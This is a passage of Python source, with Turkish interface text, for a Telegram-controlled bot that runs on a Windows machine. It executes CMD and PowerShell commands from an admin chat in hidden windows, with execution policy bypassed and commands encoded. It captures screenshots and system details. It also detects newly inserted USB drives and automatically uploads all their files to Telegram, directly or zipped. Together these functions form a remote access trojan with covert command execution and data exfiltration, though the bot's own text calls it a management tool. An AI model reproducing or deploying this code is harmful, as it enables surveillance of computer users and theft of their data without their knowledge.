• **Son Değişiklikler:** Canlı sistemdeki son 25 dosya değişikliğini listeler.
• **İstatistikler:** Detaylı izleme istatistikleri.
• **Filtre Ayarları:** İzleme ayarları, filtreler ve gölge kopya bilgilerini gösterir.
• **Canlı Dosyalar:** Son oluşturulan *canlı* dosyaları listeler/gönderir.
• **Gölge Kopyalar:** *Gölge kopyalanmış* (yedeklenmiş) dosyaları listeler/gönderir.
• **Yardım:** Bu yardım menüsü.

**🔧 Teknik Bilgiler:**
• Observer: {observer_instance_type}
• Olay Kısıtlama: {EVENT_THROTTLE} sn
• Maksimum Kayıt: {max_changes}
• Dosya Limiti: {FM_MAX_FILE_SIZE // (1024*1024)}MB
• ZIP Limiti: {FM_MAX_ZIP_SIZE // (1024*1024)}MB
• Gölge Kopya Yolu: `{get_shadow_copy_base_dir()}`
    """
    bot.send_message(chat_id, help_text, parse_mode='Markdown', reply_markup=file_monitoring_submenu())

def fm_send_startup_message():
    system_info = fm_get_system_info()
    startup_msg = f"""
🚀 **Dosya İzleme Modülü Başlatıldı!**
    (Gölge Kopya ve Çöp Kutusu Aktif)

💻 **Sistem (İzleme İçin):** {system_info['hostname']} ({system_info['platform']})
🕒 **Başlatma:** {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
🛡️ **Gölge Kopyalar:** `{get_shadow_copy_base_dir()}`

Bot dosya sistemi değişikliklerini izliyor.
Ana menüdeki "📁 Dosya İzleme" butonu ile erişebilirsiniz.
    """
    try: bot.send_message(int(ADMIN_CHAT_ID), startup_msg, parse_mode='Markdown')
    except Exception as e: print(f"Dosya izleme başlangıç mesajı gönderilemedi: {e}")


def send_startup_message():
    try:
        hostname = socket.gethostname()
        bot.send_message(
            int(ADMIN_CHAT_ID),
            f"🤖 **Bot Başlatıldı!**\n"
            f"💻 **Bağlanılan Cihaz:** {hostname}\n"
            f"📱 **Etkileşim için /start komutunu kullanın.**"
        )
    except Exception as e:
        print(f"Başlangıç mesajı gönderilemedi: {e}")

def take_screenshot():
    try:
        screenshot = ImageGrab.grab()
        img_buffer = BytesIO()
        screenshot.save(img_buffer, format='PNG')
        img_buffer.seek(0)
        return img_buffer
    except Exception as e:
        return None

def execute_cmd_command(command):
    try:
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        startupinfo.wShowWindow = subprocess.SW_HIDE
        result = subprocess.run(
            command,
            shell=True,
            capture_output=True,
            text=True,
            timeout=30,
            startupinfo=startupinfo,
            creationflags=subprocess.CREATE_NO_WINDOW,
            encoding='utf-8',
            errors='replace'
        )
        output = f"**CMD Komut:** `{command}`\n\n"
        if result.stdout:
            output += f"**✅ Çıktı:**\n```\n{result.stdout}\n```\n"
        if result.stderr:
            output += f"**❌ Hata:**\n```\n{result.stderr}\n```\n"
        output += f"**📊 Durum Kodu:** {result.returncode}"
        return output
    except subprocess.TimeoutExpired:
        return f"**⏰ Komut zaman aşımına uğradı:** `{command}`"
    except Exception as e:
        return f"**❌ Komut çalıştırılırken hata:** `{command}`\n**Hata:** {str(e)}"

def execute_powershell_command(command):
    try:
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        startupinfo.wShowWindow = subprocess.SW_HIDE
        ps_command = [
            "powershell.exe",
            "-NoProfile",
            "-ExecutionPolicy", "Bypass",
            "-WindowStyle", "Hidden",
            "-EncodedCommand",
            subprocess.check_output([
                "powershell.exe",
                "-Command",
                f"[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('{command}'))"
            ], startupinfo=startupinfo, creationflags=subprocess.CREATE_NO_WINDOW).decode().strip()
        ]
        result = subprocess.run(
            ps_command,
            capture_output=True,
            text=True,
            timeout=30,
            startupinfo=startupinfo,
            creationflags=subprocess.CREATE_NO_WINDOW,
            encoding='utf-8',
            errors='replace'
        )
        output = f"**PowerShell Komut:** `{command}`\n\n"
        if result.stdout:
            output += f"**✅ Çıktı:**\n```\n{result.stdout}\n```\n"
        if result.stderr:
            output += f"**❌ Hata:**\n```\n{result.stderr}\n```\n"
        output += f"**📊 Durum Kodu:** {result.returncode}"
        return output
    except subprocess.TimeoutExpired:
        return f"**⏰ PowerShell komut zaman aşımına uğradı:** `{command}`"
    except Exception as e:
        return f"**❌ PowerShell komut çalıştırılırken hata:** `{command}`\n**Hata:** {str(e)}"

def get_system_info():
    try:
        system_info_list = []
        system_info_list.append("🖥️ **SİSTEM BİLGİLERİ**\n")
        system_info_list.append(f"**İşletim Sistemi:** {platform.system()} {platform.release()}")
        system_info_list.append(f"**Sürüm:** {platform.version()}")
        system_info_list.append(f"**Mimari:** {platform.architecture()[0]}")
        system_info_list.append(f"**Bilgisayar Adı:** {platform.node()}")
        try:
            system_info_list.append(f"**Kullanıcı:** {os.getlogin()}")
        except:
            system_info_list.append(f"**Kullanıcı:** Belirlenemedi")
        system_info_list.append(f"\n🔧 **İŞLEMCİ BİLGİLERİ**")
        system_info_list.append(f"**İşlemci:** {platform.processor()}")
        system_info_list.append(f"**Çekirdek Sayısı:** {psutil.cpu_count(logical=False)}")
        system_info_list.append(f"**Mantıksal İşlemci:** {psutil.cpu_count(logical=True)}")
        system_info_list.append(f"**CPU Kullanımı:** {psutil.cpu_percent(interval=1)}%")
        memory = psutil.virtual_memory()
        system_info_list.append(f"\n💾 **BELLEK BİLGİLERİ**")
        system_info_list.append(f"**Toplam RAM:** {memory.total // (1024**3)} GB")
        system_info_list.append(f"**Kullanılan RAM:** {memory.used // (1024**3)} GB")
        system_info_list.append(f"**Boş RAM:** {memory.available // (1024**3)} GB")
        system_info_list.append(f"**RAM Kullanım Oranı:** {memory.percent}%")
        system_info_list.append(f"\n💿 **DİSK BİLGİLERİ**")
        for partition in psutil.disk_partitions():
            try:
                usage = psutil.disk_usage(partition.mountpoint)
                system_info_list.append(f"**{partition.device}**")
                system_info_list.append(f"  - Toplam: {usage.total // (1024**3)} GB")
                system_info_list.append(f"  - Kullanılan: {usage.used // (1024**3)} GB")
                system_info_list.append(f"  - Boş: {usage.free // (1024**3)} GB")
                system_info_list.append(f"  - Kullanım: {usage.percent}%")
            except:
                continue
        system_info_list.append(f"\n🌐 **AĞ BİLGİLERİ**")
        try:
            hostname = socket.gethostname()
            system_info_list.append(f"**Hostname:** {hostname}")
        except:
            pass
        boot_time = datetime.fromtimestamp(psutil.boot_time())
        system_info_list.append(f"\n⏰ **SİSTEM DURUMU**")
        system_info_list.append(f"**Sistem Başlatma Zamanı:** {boot_time.strftime('%d/%m/%Y %H:%M:%S')}")
        system_info_list.append(f"**Çalışma Süresi:** {datetime.now() - boot_time}")
        return "\n".join(system_info_list)
    except Exception as e:
        return f"Sistem bilgileri alınırken hata oluştu: {str(e)}"

def get_usb_drives():
    drives = []
    for drive_char_code in range(ord('A'), ord('Z')+1):
        drive_path = f"{chr(drive_char_code)}:\\"
        try:
            if os.path.exists(drive_path) and win32file.GetDriveType(drive_path) == win32con.DRIVE_REMOVABLE:
                try:
                    volume_info = win32api.GetVolumeInformation(drive_path)
                    label = volume_info[0] or 'USB Disk'
                except:
                    label = 'USB Disk'
                drives.append({
                    'path': drive_path,
                    'label': label
                })
        except:
            continue
    return drives

def get_usb_structure(drive_path):
    try:
        structure = []
        total_files = 0
        total_size = 0
        structure.append(f"📁 **USB DİSK YAPISI: {drive_path}**\n")
        for root, dirs, files in os.walk(drive_path):
            level = root.replace(drive_path, '').count(os.sep)
            indent = '  ' * level
            folder_name = os.path.basename(root) or drive_path
            if level == 0:
                structure.append(f"📂 **{folder_name}**")
            else:
                structure.append(f"{indent}📂 {folder_name}/")
            subindent = '  ' * (level + 1)
            for file in files:
                try:
                    file_path = os.path.join(root, file)
                    file_size = os.path.getsize(file_path)
                    total_size += file_size
                    total_files += 1
                    if file_size < 1024:
                        size_str = f"{file_size} B"
                    elif file_size < 1024*1024:
                        size_str = f"{file_size/1024:.1f} KB"
                    else:
                        size_str = f"{file_size/(1024*1024):.1f} MB"
                    ext = os.path.splitext(file)[1].lower()
                    if ext in ['.jpg', '.jpeg', '.png', '.gif', '.bmp']:
                        emoji = '🖼️'
                    elif ext in ['.mp4', '.avi', '.mkv', '.mov']:
                        emoji = '🎥'
                    elif ext in ['.mp3', '.wav', '.flac']:
                        emoji = '🎵'
                    elif ext in ['.txt', '.doc', '.docx', '.pdf']:
                        emoji = '📄'
                    elif ext in ['.zip', '.rar', '.7z']:
                        emoji = '📦'
                    elif ext in ['.exe', '.msi']:
                        emoji = '⚙️'
                    else:
                        emoji = '📄'
                    structure.append(f"{subindent}{emoji} {file} ({size_str})")
                except:
                    structure.append(f"{subindent}📄 {file} (boyut alınamadı)")
        structure.append(f"\n📊 **ÖZET BİLGİLER:**")
        structure.append(f"**Toplam Dosya Sayısı:** {total_files}")
        structure.append(f"**Toplam Boyut:** {total_size/(1024*1024):.2f} MB")
        return "\n".join(structure)
    except Exception as e:
        return f"USB yapısı alınırken hata oluştu: {str(e)}"

def send_file_worker(chat_id, file_info):
    try:
        with open(file_info['path'], 'rb') as f:
            bot.send_document(
                chat_id,
                f,
                caption=f"📄 {file_info['name']}\n"
                       f"📍 {file_info['path']}\n"
                       f"📏 {file_info['size'] / 1024:.1f} KB"
            )
        return True, file_info['name']
    except Exception as e:
        return False, f"Dosya gönderilemedi: {file_info['path']}\nHata: {str(e)}"

def scan_and_send_usb_files(chat_id, drive_path):
    try:
        files_to_send = []
        total_size = 0
        for root, dirs, filenames in os.walk(drive_path):
            for filename in filenames:
                file_path = os.path.join(root, filename)
                try:
                    size = os.path.getsize(file_path)
                    total_size += size
                    files_to_send.append({
                        'path': file_path,
                        'size': size,
                        'name': filename
                    })
                except:
                    continue
        if not files_to_send:
            bot.send_message(chat_id, "❌ USB diskte dosya bulunamadı.")
            return
        files_to_send.sort(key=lambda x: x['size'])
        bot.send_message(
            chat_id,
            f"📊 **USB Disk Tarama Sonuçları (Direkt):**\n"
            f"📂 **Sürücü:** {drive_path}\n"
            f"📏 **Toplam Boyut:** {total_size / (1024*1024):.2f} MB\n"
            f"📄 **Dosya Sayısı:** {len(files_to_send)}\n"
            f"⚡ **Worker Sayısı:** {MAX_WORKERS}\n\n"
            f"🚀 Dosya gönderimi başlatılıyor..."
        )
        success_count = 0
        error_count = 0
        with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
            future_to_file = {
                executor.submit(send_file_worker, chat_id, file_info): file_info
                for file_info in files_to_send
            }
            for future in concurrent.futures.as_completed(future_to_file):
                success, result = future.result()
                if success:
                    success_count += 1
                else:
                    error_count += 1
                    bot.send_message(chat_id, f"❌ {result}")
                if (success_count + error_count) % 10 == 0:
                    bot.send_message(
                        chat_id,
                        f"📈 İlerleme: {success_count + error_count}/{len(files_to_send)} dosya işlendi"
                    )
        bot.send_message(
            chat_id,
            f"✅ **Direkt Gönderim Tamamlandı!**\n"
            f"🟢 **Başarılı:** {success_count} dosya\n"
            f"🔴 **Hatalı:** {error_count} dosya\n"
            f"📊 **Toplam:** {len(files_to_send)} dosya"
        )
    except Exception as e:
        bot.send_message(chat_id, f"❌ USB disk taranırken hata oluştu: {str(e)}")

def auto_scan_usb_files(chat_id):
    previous_drives = set()
    bot.send_message(chat_id, "🔍 Otomatik USB tarama (Direkt Mod) aktif. Yeni takılan USB diskler taranacak.")
    while True:
        try:
            current_drives_info = get_usb_drives()
            current_drive_paths = set(drive['path'] for drive in current_drives_info)
            new_drives = current_drive_paths - previous_drives
            for drive_path in new_drives:
                bot.send_message(
                    chat_id,
                    f"🔌 **Yeni USB disk tespit edildi (Direkt Mod):** {drive_path}\n📋 Yapı bilgisi alınıyor..."
                )
                structure = get_usb_structure(drive_path)
                if len(structure) > 4000:
                    parts = [structure[i:i+4000] for i in range(0, len(structure), 4000)]
                    for i, part in enumerate(parts):
                        bot.send_message(chat_id, f"**Kısım {i+1}/{len(parts)}**\n{part}")
                else:
                    bot.send_message(chat_id, structure)
                bot.send_message(chat_id, f"📤 Dosya gönderimi (Direkt Mod) başlatılıyor...")
                scan_and_send_usb_files(chat_id, drive_path)
            previous_drives = current_drive_paths
            time.sleep(5)
        except Exception as e:
            bot.send_message(chat_id, f"❌ Otomatik direkt tarama hatası: {str(e)}. Tarama durduruldu.")
            break

def copy_usb_to_temp(drive_path):
    try:
        temp_dir = tempfile.gettempdir()
        unique_folder = str(uuid.uuid4())[:8]
        temp_usb_path = os.path.join(temp_dir, f"usb_backup_{unique_folder}")
        os.makedirs(temp_usb_path, exist_ok=True)
        total_files_walk = 0
        copied_files = 0
        for root, dirs, files_in_root in os.walk(drive_path):
            total_files_walk += len(files_in_root)
        for root, dirs, files_in_root in os.walk(drive_path):
            for file_item in files_in_root:
                try:
                    src_file = os.path.join(root, file_item)
                    rel_path = os.path.relpath(src_file, drive_path)
                    dest_file = os.path.join(temp_usb_path, rel_path)
                    dest_dir = os.path.dirname(dest_file)
                    os.makedirs(dest_dir, exist_ok=True)
                    shutil.copy2(src_file, dest_file)
                    copied_files += 1
                except Exception as e:
                    continue
        return temp_usb_path, copied_files, total_files_walk
    except Exception as e:
        return None, 0, 0

def cleanup_temp_folder(temp_path):
    try:
        if os.path.exists(temp_path):
            shutil.rmtree(temp_path)
            return True
    except Exception as e:
        return False
    return False

def send_file_worker_from_temp(chat_id, file_info):
    try:
        if not os.path.exists(file_info['path']):
            return False, f"Dosya bulunamadı: {file_info['name']}"
        with open(file_info['path'], 'rb') as f:
            bot.send_document(
                chat_id,
                f,
                caption=f"📄 {file_info['name']}\n"
                       f"📍 {file_info['original_path']}\n"
                       f"📏 {file_info['size'] / 1024:.1f} KB"
            )
        return True, file_info['name']
    except Exception as e:
        return False, f"Dosya gönderilemedi: {file_info['name']}\nHata: {str(e)}"

def scan_and_send_temp_files(chat_id, temp_path, original_drive_path):
    try:
        files_to_send = []
        total_size = 0
        for root, dirs, filenames in os.walk(temp_path):
            for filename in filenames:
                file_path = os.path.join(root, filename)
                try:
                    size = os.path.getsize(file_path)
                    total_size += size
                    rel_path = os.path.relpath(file_path, temp_path)
                    original_path = os.path.join(original_drive_path, rel_path)
                    files_to_send.append({
                        'path': file_path,
                        'size': size,
                        'name': filename,
                        'original_path': original_path
                    })
                except:
                    continue
        if not files_to_send:
            cleanup_temp_folder(temp_path)
            bot.send_message(chat_id, "❌ Geçici klasörde dosya bulunamadı.")
            return
        files_to_send.sort(key=lambda x: x['size'])
        bot.send_message(
            chat_id,
            f"📊 **USB Dosyaları Temp'e Kopyalandı (Ayrı Dosyalar):**\n"
            f"📂 **Kaynak:** {original_drive_path}\n"
            f"💾 **Temp Klasör:** {temp_path}\n"
            f"📏 **Toplam Boyut:** {total_size / (1024*1024):.2f} MB\n"
            f"📄 **Dosya Sayısı:** {len(files_to_send)}\n"
            f"⚡ **Worker Sayısı:** {MAX_WORKERS}\n\n"
            f"🚀 Dosya gönderimi başlatılıyor..."
        )
        success_count = 0
        error_count = 0
        with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
            future_to_file = {
                executor.submit(send_file_worker_from_temp, chat_id, file_info): file_info
                for file_info in files_to_send
            }
            for future in concurrent.futures.as_completed(future_to_file):
                success, result = future.result()
                if success:
                    success_count += 1
                else:
                    error_count += 1
                    bot.send_message(chat_id, f"❌ {result}")
                if (success_count + error_count) % 10 == 0:
                    bot.send_message(
                        chat_id,
                        f"📈 İlerleme: {success_count + error_count}/{len(files_to_send)} dosya işlendi"
                    )
        cleanup_temp_folder(temp_path)
        bot.send_message(
            chat_id,
            f"✅ **Gönderim Tamamlandı ve Temp Temizlendi! (Ayrı Dosyalar)**\n"
            f"🟢 **Başarılı:** {success_count} dosya\n"
            f"🔴 **Hatalı:** {error_count} dosya\n"
            f"📊 **Toplam:** {len(files_to_send)} dosya\n"
            f"🗑️ **Temp klasör silindi:** {os.path.basename(temp_path)}"
        )
    except Exception as e:
        cleanup_temp_folder(temp_path)
        bot.send_message(chat_id, f"❌ Temp dosyaları gönderilirken hata: {str(e)}")

def copy_and_send_usb_files_via_temp(chat_id, drive_path):
    try:
        bot.send_message(chat_id, f"📋 USB dosyaları temp klasörüne kopyalanıyor (Ayrı Dosyalar): {drive_path}")
        temp_path, copied_files, total_files = copy_usb_to_temp(drive_path)
        if not temp_path:
            bot.send_message(chat_id, "❌ USB dosyaları temp'e kopyalanamadı.")
            return
        bot.send_message(
            chat_id,
            f"✅ **USB → Temp Kopyalama Tamamlandı! (Ayrı Dosyalar)**\n"
            f"📁 **Temp Klasör:** {os.path.basename(temp_path)}\n"
            f"📄 **Kopyalanan:** {copied_files}/{total_files} dosya\n"
            f"💡 **USB artık çıkarılabilir!**"
        )
        threading.Thread(
            target=scan_and_send_temp_files,
            args=(chat_id, temp_path, drive_path),
            daemon=True
        ).start()
    except Exception as e:
        bot.send_message(chat_id, f"❌ USB temp kopyalama hatası: {str(e)}")

def auto_scan_usb_files_via_temp(chat_id):
    previous_drives = set()
    bot.send_message(chat_id, "🔍 Otomatik USB tarama (Temp Modu - Ayrı Dosyalar) aktif.")
    while True:
        try:
            current_drives_info = get_usb_drives()
            current_drive_paths = set(drive['path'] for drive in current_drives_info)
            new_drives = current_drive_paths - previous_drives
            for drive_path in new_drives:
                bot.send_message(
                    chat_id,
                    f"🔌 **Yeni USB tespit edildi (Temp - Ayrı):** {drive_path}\n📋 Yapı bilgisi alınıyor..."
                )
                structure = get_usb_structure(drive_path)
                if len(structure) > 4000:
                    parts = [structure[i:i+4000] for i in range(0, len(structure), 4000)]
                    for i, part in enumerate(parts):
                        bot.send_message(chat_id, f"**Kısım {i+1}/{len(parts)}**\n{part}")
                else:
                    bot.send_message(chat_id, structure)
                copy_and_send_usb_files_via_temp(chat_id, drive_path)
            previous_drives = current_drive_paths
            time.sleep(5)
        except Exception as e:
            bot.send_message(chat_id, f"❌ Otomatik temp (ayrı) tarama hatası: {str(e)}. Tarama durduruldu.")
            break

def create_zip_from_folder(folder_path, zip_path):
    try:
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for root, dirs, files in os.walk(folder_path):
                for file in files:
                    file_path = os.path.join(root, file)
                    arcname = os.path.relpath(file_path, folder_path)
                    zipf.write(file_path, arcname)
        return True
    except Exception as e:
        return False

def get_folder_size(folder_path):
    total_size = 0
    for root, dirs, files in os.walk(folder_path):
        for file in files:
            try:
                total_size += os.path.getsize(os.path.join(root, file))
            except:
                continue
    return total_size

def send_folder_as_zip(chat_id, folder_info):
    zip_file_to_remove = None
    try:
        if not os.path.exists(folder_info['path']):
            return False, f"Klasör bulunamadı: {folder_info['name']}"
        zip_filename = f"{folder_info['name']}.zip"
        zip_path = os.path.join(os.path.dirname(folder_info['path']), zip_filename)
        zip_file_to_remove = zip_path
        if not create_zip_from_folder(folder_info['path'], zip_path):
            return False, f"ZIP oluşturulamadı: {folder_info['name']}"
        zip_size = os.path.getsize(zip_path)
        with open(zip_path, 'rb') as f:
            bot.send_document(
                chat_id,
                f,
                caption=f"📁 **Klasör:** {folder_info['name']}\n"
                       f"📍 **Kaynak:** {folder_info['original_path']}\n"
                       f"📏 **Orijinal Boyut:** {folder_info['size'] / (1024*1024):.2f} MB\n"
                       f"🗜️ **ZIP Boyut:** {zip_size / (1024*1024):.2f} MB\n"
                       f"📊 **Sıkıştırma:** {((folder_info['size'] - zip_size) / folder_info['size'] * 100) if folder_info['size'] > 0 else 0:.1f}%"
            )
        try:
            if zip_file_to_remove and os.path.exists(zip_file_to_remove):
                os.remove(zip_file_to_remove)
        except:
            pass
        return True, folder_info['name']
    except Exception as e:
        try:
            if zip_file_to_remove and os.path.exists(zip_file_to_remove):
                os.remove(zip_file_to_remove)
        except:
            pass
        return False, f"Klasör ZIP gönderilemedi: {folder_info['name']}\nHata: {str(e)}"

def scan_and_send_temp_files_as_zip(chat_id, temp_path, original_drive_path):
    try:
        items_to_send = []
        total_size = 0
        for item in os.listdir(temp_path):
            item_path = os.path.join(temp_path, item)
            original_item_path = os.path.join(original_drive_path, item)
            if os.path.isdir(item_path):
                folder_size = get_folder_size(item_path)
                total_size += folder_size
                items_to_send.append({
                    'path': item_path,
                    'name': item,
                    'type': 'folder',
                    'size': folder_size,
                    'original_path': original_item_path
                })
            else:
                try:
                    file_size = os.path.getsize(item_path)
                    total_size += file_size
                    items_to_send.append({
                        'path': item_path,
                        'name': item,
                        'type': 'file',
                        'size': file_size,
                        'original_path': original_item_path
                    })
                except:
                    continue
        if not items_to_send:
            cleanup_temp_folder(temp_path)
            bot.send_message(chat_id, "❌ Geçici klasörde öğe bulunamadı.")
            return
        items_to_send.sort(key=lambda x: x['size'])
        folders_count = sum(1 for item in items_to_send if item['type'] == 'folder')
        files_count = sum(1 for item in items_to_send if item['type'] == 'file')
        bot.send_message(
            chat_id,
            f"📊 **USB İçeriği Analizi (ZIP Modu):**\n"
            f"📂 **Kaynak:** {original_drive_path}\n"
            f"💾 **Temp Klasör:** {temp_path}\n"
            f"📏 **Toplam Boyut:** {total_size / (1024*1024):.2f} MB\n"
            f"📁 **Klasör Sayısı:** {folders_count} (ZIP olarak)\n"
            f"📄 **Dosya Sayısı:** {files_count} (Doğrudan)\n"
            f"⚡ **Worker Sayısı:** {MAX_WORKERS}\n\n"
            f"🚀 Gönderim başlatılıyor..."
        )
        success_count = 0
        error_count = 0
        with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
            future_to_item = {}
            for item_info in items_to_send:
                if item_info['type'] == 'folder':
                    future = executor.submit(send_folder_as_zip, chat_id, item_info)
                else:
                    future = executor.submit(send_file_worker_from_temp, chat_id, item_info)
                future_to_item[future] = item_info
            for future in concurrent.futures.as_completed(future_to_item):
                success, result = future.result()
                if success:
                    success_count += 1
                else:
                    error_count += 1
                    bot.send_message(chat_id, f"❌ {result}")
                if (success_count + error_count) % 5 == 0:
                    bot.send_message(
                        chat_id,
                        f"📈 İlerleme: {success_count + error_count}/{len(items_to_send)} öğe işlendi"
                    )
        cleanup_temp_folder(temp_path)
        bot.send_message(
            chat_id,
            f"✅ **Gönderim Tamamlandı ve Temp Temizlendi! (ZIP Modu)**\n"
            f"🟢 **Başarılı:** {success_count} öğe\n"
            f"🔴 **Hatalı:** {error_count} öğe\n"
            f"📊 **Toplam:** {len(items_to_send)} öğe\n"
            f"📁 **ZIP Klasörler:** {folders_count}\n"
            f"📄 **Direkt Dosyalar:** {files_count}\n"
            f"🗑️ **Temp klasör silindi:** {os.path.basename(temp_path)}"
        )
    except Exception as e:
        cleanup_temp_folder(temp_path)
        bot.send_message(chat_id, f"❌ Temp ZIP gönderimi hatası: {str(e)}")

def copy_and_send_usb_files_via_zip(chat_id, drive_path):
    try:
        bot.send_message(chat_id, f"📋 USB dosyaları temp klasörüne kopyalanıyor (ZIP Modu): {drive_path}")
        temp_path, copied_files, total_files = copy_usb_to_temp(drive_path)
        if not temp_path:
            bot.send_message(chat_id, "❌ USB dosyaları temp'e kopyalanamadı.")
            return
        bot.send_message(
            chat_id,
            f"✅ **USB → Temp Kopyalama Tamamlandı! (ZIP Modu)**\n"
            f"📁 **Temp Klasör:** {os.path.basename(temp_path)}\n"
            f"📄 **Kopyalanan:** {copied_files}/{total_files} dosya\n"
            f"🗜️ **Klasörler ZIP olacak, dosyalar direkt gönderilecek**\n"
            f"💡 **USB artık çıkarılabilir!**"
        )
        threading.Thread(
            target=scan_and_send_temp_files_as_zip,
            args=(chat_id, temp_path, drive_path),
            daemon=True
        ).start()
    except Exception as e:
        bot.send_message(chat_id, f"❌ USB ZIP kopyalama hatası: {str(e)}")

def auto_scan_usb_files_via_zip(chat_id):
    previous_drives = set()
    bot.send_message(chat_id, "🔍 Otomatik USB tarama (ZIP modu) aktif.")
    while True:
        try:
            current_drives_info = get_usb_drives()
            current_drive_paths = set(drive['path'] for drive in current_drives_info)
            new_drives = current_drive_paths - previous_drives
            for drive_path in new_drives:
                bot.send_message(
                    chat_id,
                    f"🔌 **Yeni USB tespit edildi (ZIP Modu):** {drive_path}\n📋 Yapı bilgisi alınıyor..."
                )
                structure = get_usb_structure(drive_path)
                if len(structure) > 4000:
                    parts = [structure[i:i+4000] for i in range(0, len(structure), 4000)]
                    for i, part in enumerate(parts):
                        bot.send_message(chat_id, f"**Kısım {i+1}/{len(parts)}**\n{part}")
                else:
                    bot.send_message(chat_id, structure)
                copy_and_send_usb_files_via_zip(chat_id, drive_path)
            previous_drives = current_drive_paths
            time.sleep(5)
        except Exception as e:
            bot.send_message(chat_id, f"❌ Otomatik ZIP tarama hatası: {str(e)}. Tarama durduruldu.")
            break

def usb_drives_menu():
    keyboard = InlineKeyboardMarkup()
    drives = get_usb_drives()
    keyboard.add(InlineKeyboardButton("🗜️ Otomatik USB Tarama (ZIP)", callback_data="auto_scan_usb_zip"))
    keyboard.add(InlineKeyboardButton("📁 Otomatik USB Tarama (Temp)", callback_data="auto_scan_usb_temp"))
    keyboard.add(InlineKeyboardButton("⚡ Otomatik USB Tarama (Direkt)", callback_data="auto_scan_usb_start"))
    if not drives:
        keyboard.add(InlineKeyboardButton("❌ USB Disk Bulunamadı", callback_data="no_usb_found"))
    else:
        for idx, drive in enumerate(drives):
            keyboard.row(
                InlineKeyboardButton(
                    f"📂 {drive['label']} ({drive['path']}) Yapısı",
                    callback_data=f"show_usb_structure_{idx}"
                )
            )
            keyboard.row(
                InlineKeyboardButton(
                    f"🗜️ ZIP Gönder",
                    callback_data=f"scan_usb_zip_{idx}"
                ),
                InlineKeyboardButton(
                    f"📁 Temp Gönder",
                    callback_data=f"scan_usb_temp_{idx}"
                ),
                InlineKeyboardButton(
                    f"⚡ Direkt",
                    callback_data=f"scan_usb_drive_{idx}"
                )
            )
    keyboard.add(InlineKeyboardButton("🔄 Listeyi Yenile", callback_data="refresh_usb_list"))
    keyboard.add(InlineKeyboardButton("🏠 Ana Menüye Dön", callback_data="back_to_main_menu"))
    return keyboard

def main_menu():
    keyboard = InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        InlineKeyboardButton("💾 USB Diskleri Yönet", callback_data="manage_usb_disks"),
        InlineKeyboardButton("🖥️ Sistem Bilgisi", callback_data="show_system_info")
    )
    keyboard.add(
        InlineKeyboardButton("💻 CMD Komut Çalıştır", callback_data="cmd_execute"),
        InlineKeyboardButton("🔵 PowerShell Komut", callback_data="powershell_execute")
    )
    keyboard.add(
        InlineKeyboardButton("📸 Ekran Görüntüsü Al", callback_data="take_screenshot"),
        InlineKeyboardButton("⚙️ Worker Ayarları", callback_data="worker_settings")
    )
    keyboard.add(InlineKeyboardButton("📁 Dosya İzleme & Yedekleme", callback_data="file_monitoring_menu"))
    return keyboard

def file_monitoring_submenu():
    keyboard = InlineKeyboardMarkup(row_width=2)
    keyboard.add(InlineKeyboardButton("📋 Dosya İzleme Karşılama", callback_data="fm_welcome"))
    keyboard.add(
        InlineKeyboardButton("📝 Son Değişiklikler", callback_data="fm_changes"),
        InlineKeyboardButton("📊 İstatistikler", callback_data="fm_stats")
    )
    keyboard.add(
        InlineKeyboardButton("📂 Canlı Dosyaları Listele/Gönder", callback_data="fm_sendfiles"),
        InlineKeyboardButton("🗄️ Gölge Kopyaları Listele/Gönder", callback_data="fm_listshadows")
    )
    keyboard.add(
        InlineKeyboardButton("🔍 Filtre Ayarları", callback_data="fm_filter"),
        InlineKeyboardButton("🆘 Dosya İzleme Yardım", callback_data="fm_help")
    )
    keyboard.add(InlineKeyboardButton("🏠 Ana Menüye Dön", callback_data="back_to_main_menu"))
    return keyboard

def worker_settings_menu():
    keyboard = InlineKeyboardMarkup()
    keyboard.add(InlineKeyboardButton(f"📊 Mevcut Worker Sayısı: {MAX_WORKERS}", callback_data="current_workers"))
    keyboard.row(
        InlineKeyboardButton("➖ Azalt", callback_data="decrease_workers"),
        InlineKeyboardButton("➕ Arttır", callback_data="increase_workers")
    )
    keyboard.add(InlineKeyboardButton("🏠 Ana Menüye Dön", callback_data="back_to_main_menu"))
    return keyboard

@bot.message_handler(commands=['start'])
def send_start_command(message):
    if str(message.chat.id) != ADMIN_CHAT_ID:
        bot.reply_to(message, "Yetkiniz yok.")
        return
    global command_mode
    command_mode = {"cmd": False, "powershell": False}
    bot.send_message(
        message.chat.id,
        "🤖 **USB Yönetim & Dosya İzleme Botuna Hoş Geldiniz!**\n\n"
        "Bu bot ile:\n"
        "💾 USB disklerinizi yönetebilir\n"
        "📁 Dosya sistemi değişikliklerini izleyebilir ve yedekleyebilir\n"
        "🖥️ Sistem bilgilerinizi görüntüleyebilir\n"
        "💻 CMD komutları çalıştırabilir\n"
        "🔵 PowerShell komutları çalıştırabilir\n"
        "📸 Ekran görüntüsü alabilir\n"
        "⚡ Hızlı dosya transferi yapabilirsiniz",
        reply_markup=main_menu()
    )

@bot.message_handler(func=lambda message: message.text and not message.text.startswith('/'))
def handle_text_messages(message):
    global command_mode
    if str(message.chat.id) != ADMIN_CHAT_ID:
        return
    command = message.text.strip()
    if command_mode["cmd"]:
        if command.lower() in ['exit', 'çıkış', 'quit']:
            command_mode["cmd"] = False
            bot.send_message(
                message.chat.id,
                "✅ CMD modu kapatıldı. Ana menüye dönülüyor.",
                reply_markup=main_menu()
            )
            return
        bot.send_message(message.chat.id, f"⚡ CMD komutu çalıştırılıyor: `{command}`")
        result = execute_cmd_command(command)
        if len(result) > 4000:
            parts = [result[i:i+4000] for i in range(0, len(result), 4000)]
            for i, part in enumerate(parts):
                bot.send_message(message.chat.id, f"**Kısım {i+1}/{len(parts)}**\n{part}")
        else:
            bot.send_message(message.chat.id, result)
        bot.send_message(
            message.chat.id,
            "💻 **CMD Aktif** - Başka komut yazın veya 'exit' yazarak çıkın."
        )
    elif command_mode["powershell"]:
